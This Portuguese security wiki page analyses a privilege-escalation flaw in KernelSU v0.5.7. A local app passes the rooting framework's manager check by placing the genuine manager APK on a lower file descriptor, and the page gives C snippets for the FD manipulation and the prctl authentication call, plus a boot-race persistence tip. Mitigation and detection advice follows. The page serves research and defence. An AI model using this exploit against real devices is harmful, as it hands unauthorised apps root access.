# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Frameworks de rooting como KernelSU, APatch, SKRoot e Magisk frequentemente aplicam patches no kernel Linux/Android e expõem funcionalidades privilegiadas a um app "manager" em userspace sem privilégios por meio de um syscall hook. Se a etapa de autenticação do manager apresentar falhas, qualquer app local poderá alcançar esse canal e escalar privilégios em dispositivos que já possuem root.

Esta página abstrai as técnicas e armadilhas identificadas em pesquisas públicas (notavelmente a análise da Zimperium sobre o KernelSU v0.5.7) para ajudar equipes red e blue a compreender as superfícies de ataque, as primitivas de exploração e as mitigações robustas.

---
## Padrão de arquitetura: canal do manager com syscall hook

- Um módulo/patch do kernel aplica hook em um syscall (comumente prctl) para receber "comandos" do userspace.
- O protocolo normalmente é: magic_value, command_id, arg_ptr/len ...
- Um app manager em userspace realiza primeiro a autenticação (por exemplo, CMD_BECOME_MANAGER). Depois que o kernel marca o chamador como um manager confiável, os comandos privilegiados são aceitos:
- Conceder root ao chamador (por exemplo, CMD_GRANT_ROOT)
- Gerenciar allowlists/deny-lists do su
- Ajustar a política SELinux (por exemplo, CMD_SET_SEPOLICY)
- Consultar a versão/configuração
- Como qualquer app pode invocar syscalls, a correção da autenticação do manager é crítica.

Exemplo (design do KernelSU):
- Syscall com hook: prctl
- Magic value para redirecionar ao handler do KernelSU: 0xDEADBEEF
- Os comandos incluem: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT etc.

---
## Fluxo de autenticação do KernelSU v0.5.7 (conforme implementado)

Quando o userspace chama prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), o KernelSU verifica:

1) Verificação do prefixo do path
- O path fornecido deve começar com um prefixo esperado para o UID do chamador, por exemplo, /data/data/<pkg> ou /data/user/<id>/<pkg>.
- Referência: lógica de prefixo de path em core_hook.c (v0.5.7).

2) Verificação de ownership
- O path deve pertencer ao UID do chamador.
- Referência: lógica de ownership em core_hook.c (v0.5.7).

3) Verificação da assinatura do APK por meio de uma varredura da tabela de FDs
- Iterar pelos file descriptors (FDs) abertos do processo chamador.
- Selecionar o primeiro arquivo cujo path corresponda a /data/app/*/base.apk.
- Analisar a assinatura APK v2 e verificá-la em relação ao certificado oficial do manager.
- Referências: manager.c (iteração dos FDs), apk_sign.c (verificação APK v2).

Se todas as verificações forem aprovadas, o kernel armazena temporariamente em cache o UID do manager e aceita comandos privilegiados desse UID até que ele seja redefinido.

---
## Classe de vulnerabilidade: confiar no “primeiro APK correspondente” da iteração de FDs

Se a verificação da assinatura estiver vinculada ao "primeiro /data/app/*/base.apk correspondente" encontrado na tabela de FDs do processo, ela não estará realmente verificando o pacote do próprio chamador. Um atacante pode posicionar previamente um APK legitimamente assinado (o APK do manager real) para que ele apareça na tabela de FDs antes do próprio base.apk.

Essa confiança por indireção permite que um app sem privilégios se passe pelo manager sem possuir a chave de assinatura do manager.

Principais propriedades exploradas:
- A varredura de FDs não associa o arquivo à identidade do pacote do chamador; ela apenas compara padrões de strings de paths.
- open() retorna o FD disponível com o menor número. Ao fechar primeiro os FDs com numeração menor, um atacante pode controlar a ordem.
- O filtro verifica apenas se o path corresponde a /data/app/*/base.apk — não se ele corresponde ao pacote instalado do chamador.

---
## Pré-condições do ataque

- O dispositivo já possui root por meio de um framework de rooting vulnerável (por exemplo, KernelSU v0.5.7).
- O atacante pode executar código local arbitrário sem privilégios (processo de um app Android).
- O manager real ainda não foi autenticado (por exemplo, logo após uma reinicialização). Alguns frameworks armazenam em cache o UID do manager após o sucesso; é necessário vencer a corrida.

---
## Esboço da exploração (KernelSU v0.5.7)

Etapas de alto nível:
1) Criar um path válido para o diretório de dados do próprio app a fim de satisfazer as verificações de prefixo e ownership.
2) Garantir que um base.apk genuíno do KernelSU Manager seja aberto em um FD com numeração menor que a do próprio base.apk.
3) Invocar prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) para passar pelas verificações.
4) Emitir comandos privilegiados, como CMD_GRANT_ROOT, CMD_ALLOW_SU e CMD_SET_SEPOLICY, para manter a elevação.

Observações práticas sobre a etapa 2 (ordenação dos FDs):
- Identificar o FD do próprio /data/app/*/base.apk no processo percorrendo os symlinks de /proc/self/fd.
- Fechar um FD com numeração baixa (por exemplo, stdin, fd 0) e abrir primeiro o APK legítimo do manager para que ele ocupe o fd 0 (ou qualquer índice menor que o FD do próprio base.apk).
- Incluir o APK legítimo do manager no app para que o path dele satisfaça o filtro ingênuo do kernel. Por exemplo, colocá-lo em um subpath que corresponda a /data/app/*/base.apk.

Exemplos de trechos de código (Android/Linux, somente ilustrativos):

Enumerar FDs abertos para localizar entradas base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Force um FD de número menor a apontar para o APK legítimo do manager:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Autenticação do manager via hook de prctl:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
Após o sucesso, comandos privilegiados (exemplos):
- CMD_GRANT_ROOT: promover o processo atual para root
- CMD_ALLOW_SU: adicionar seu package/UID à allowlist para su persistente
- CMD_SET_SEPOLICY: ajustar a política SELinux conforme suportado pelo framework

Dica de race/persistence:
- Registrar um receiver de BOOT_COMPLETED no AndroidManifest (RECEIVE_BOOT_COMPLETED) para iniciar cedo após o reboot e tentar a autenticação antes do manager real.

---
## Orientações de detecção e mitigação

Para desenvolvedores de frameworks:
- Vincular a autenticação ao package/UID do caller, não a FDs arbitrários:
- Resolver o package do caller a partir do UID e verificar contra a assinatura do package instalado (via PackageManager), em vez de varrer FDs.
- Se for apenas kernel, usar uma identidade estável do caller (task creds) e validar contra uma fonte estável de verdade gerenciada pelo init/helper de userspace, não contra FDs de processos.
- Evitar verificações de prefixo de path como identidade; elas podem ser trivialmente satisfeitas pelo caller.
- Usar challenge–response baseado em nonce pelo channel e limpar qualquer identidade de manager armazenada em cache no boot ou em eventos importantes.
- Considerar IPC autenticado baseado em binder em vez de sobrecarregar syscalls genéricas quando viável.

Para defensores/blue team:
- Detectar a presença de rooting frameworks e processos de manager; monitorar chamadas prctl com magic constants suspeitas (por exemplo, 0xDEADBEEF) caso haja telemetria do kernel.
- Em frotas gerenciadas, bloquear ou gerar alertas para boot receivers de packages não confiáveis que tentem rapidamente executar comandos privilegiados do manager após o boot.
- Garantir que os dispositivos estejam atualizados com versões corrigidas do framework; invalidar IDs de manager armazenados em cache durante uma atualização.

Limitações do ataque:
- Afeta apenas dispositivos que já estejam rooted com um framework vulnerável.
- Normalmente requer um reboot/janela de race antes que o manager legítimo se autentique (alguns frameworks armazenam em cache o UID do manager até o reset).

---
## Notas relacionadas entre frameworks

- A autenticação baseada em password (por exemplo, builds históricos do APatch/SKRoot) pode ser fraca se as passwords forem fáceis de adivinhar ou sofrerem bruteforce, ou se as validações tiverem bugs.
- A autenticação baseada em package/signature (por exemplo, KernelSU) é, em princípio, mais forte, mas deve ser vinculada ao caller real, não a artefatos indiretos como varreduras de FD.
- Magisk: CVE-2024-48336 (MagiskEoP) mostrou que até ecossistemas maduros podem ser suscetíveis a identity spoofing, levando à execução de código com root dentro do contexto do manager.

---
## Referências

- [Zimperium – O Rooting de Todo o Mal: Falhas de Segurança Que Podem Comprometer Seu Dispositivo Móvel](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [KernelSU v0.5.7 – verificações de path em core_hook.c (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [KernelSU v0.5.7 – iteração de FD/verificação de assinatura em manager.c (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [KernelSU – verificação de APK v2 em apk_sign.c (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [Projeto KernelSU](https://kernelsu.org/)
- [APatch](https://github.com/bmax121/APatch)
- [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [Vídeo de demonstração do KSU PoC (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
